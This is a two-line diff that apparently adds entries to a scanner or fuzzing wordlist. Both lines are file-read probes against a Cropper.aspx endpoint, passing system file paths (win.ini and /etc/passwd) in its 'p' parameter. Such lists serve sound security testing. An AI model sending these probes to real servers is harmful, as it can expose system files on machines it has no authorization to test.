@@ -1,0 +1,2 @@
+/Cropper.aspx?p=C://Windows/win.ini
+/Cropper.aspx?p=/etc/passwd
